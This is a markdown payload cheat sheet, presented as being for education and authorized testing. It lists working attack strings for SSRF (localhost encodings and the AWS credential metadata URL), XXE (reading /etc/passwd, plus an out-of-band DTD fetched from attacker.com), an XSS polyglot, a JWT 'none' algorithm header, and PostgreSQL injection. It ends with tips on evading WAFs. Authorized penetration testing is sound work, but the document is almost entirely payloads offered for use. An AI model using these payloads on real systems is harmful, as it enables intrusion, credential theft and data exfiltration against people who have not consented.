# Context-Specific Payloads Vault

## Overview
A curated collection of context-specific payloads for testing various vulnerability classes. These are abstract, engineered examples used strictly for educational, research, and authorized testing purposes.

## Server-Side Request Forgery (SSRF)
Targeting internal services and bypassing naive filters.
- **Localhost Variations:**
  ```text
  http://127.0.0.1
  http://0.0.0.0
  http://localhost
  http://[::1]
  http://2130706433 (Decimal representation)
  http://0x7F000001 (Hex representation)
  ```
- **Cloud Metadata (AWS):**
  ```text
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
  ```

## XML External Entity (XXE)
- **Classic Local File Inclusion (LFI):**
  ```xml
  <?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  <data>&xxe;</data>
  ```
- **Out-of-Band (OOB) Exfiltration (requires attacker server):**
  ```xml
  <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd"> %xxe; ]>
  ```

## Cross-Site Scripting (XSS)
- **Polyglot Payload (Context-agnostic):**
  ```javascript
  javascript://%250Aalert(1)//"onclick=alert(1)//<svg/onload=alert(1)>
  ```

## JSON Web Tokens (JWT)
- **The 'None' Algorithm Header:**
  ```text
  eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
  ```
  *(Decodes to: `{"alg":"none","typ":"JWT"}`)*

## SQL Injection (PostgreSQL Context)
- **Time-based Blind:** 
  ```sql
  1; SELECT pg_sleep(5)--
  ```
- **Version Identification:** 
  ```sql
  UNION SELECT null, version()--
  ```

*Note: Payloads must always be adapted to the specific application context, encoding requirements (URL encode, Base64), and potential WAF interference.*